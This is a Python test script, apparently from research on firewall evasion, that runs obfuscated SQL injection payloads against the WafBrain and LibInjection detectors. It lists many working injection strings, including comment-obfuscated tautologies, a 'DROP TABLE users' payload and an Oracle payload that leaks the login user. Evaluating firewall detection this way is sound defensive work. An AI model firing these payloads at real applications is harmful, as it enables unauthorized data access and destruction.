import os
from gym_waf.envs.waf_brain_env import WafBrainEnv
from gym_waf.envs.libinjection_env import LibinjectionEnv
import tensorflow as tf

tf.compat.v1.disable_eager_execution()

MAXTURNS = 30
DATASET = os.path.join(os.path.dirname(__file__), 'gym_waf','data', 'sqli-1waf.csv')

#test various payloads against LibInjection and WafBrain wafs
if __name__ == '__main__':

	payload4 = "abre' ||/*fwefwe*/1876-5=0x755-6 xor/*54645*/'fdfg"  #good sqli for wafbrain, libinjection detects it
	payload2 = "abre')/*gdf*/or/*54645*/'fdfg' like/*ggd*/('fdfg"  #good sqli for wafbrain, libinjection detects it
	payload5 = "\/*gfd*/or/*fgselectdf*/substr('abcd',/*fsgdr*/2+1,0x1)='c"
	payload6 = "123);DROP/*fgdh*/TABLE/*fgdhcwe*/users --"
	payload7 = "/*ewfwe*/765/*bb*/or/*bb43534*/     0x2/*bb*/between/*bb*/1/**/and/*   ger  */0x3/*greeg*/"
	payload8 = "/*aaa 11 22 ff*/765/*aaa 11 22 ff*/or/*aaa 11 22 ff*/2/*aaa 11 22 ff*/between/*aaa 11 22 ff*/1/*aaa 11 22 ff*/and/*aaa 11 22 ff*/3/*aaa 11 22 ff*/"
	payload9 = "/*aaaa*/765/*aaaa*/or/*aaaa*/2/*aaaa*/between/*aaaa*/1/*aaaa*/and/*aaaa*/3/*aaaa*/"
	payload10 = "5'/*aaaa*/or/*aaaa*/1=1/*aaaa*/--/*aaaa*/a"
	payload12 = "/*aaaa*/select/*aaaa*/"
	payload11 = "'1 /*!00000AND 2>1*/--'"
	payload = "1' Or/*ur$%6Hhrt*/'abc'<cOnCaT('D','E','F')"
	payload2 = "2' oR ((2))>(((6) - ((3))))"
	payload = "2' oR 2<6 - 3"
	payload = "' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i"
	payload = "654) or/*fwefwe*/ (1876 -/*fwefwe*/ 5) = /*fwefwe*/ (0x755 - 6) -- ddd"
	payload = "abre' ||/*fkweoh*/ (1876 - 5) =  (0x755 - 6) and/*54645*/TRUE"
	payload = "x'/*\x0bNj@Fxka*/and\nuserid\nis\nNULL;--/**/"
	
	wb = WafBrainEnv( DATASET, MAXTURNS) 
	res = wb.interface.get_score(payload)
	print("WafBrain result: ", res)


	lb = LibinjectionEnv(DATASET, MAXTURNS)
	res = lb.interface.get_label(payload)
	print("LibInjection result: ", res)
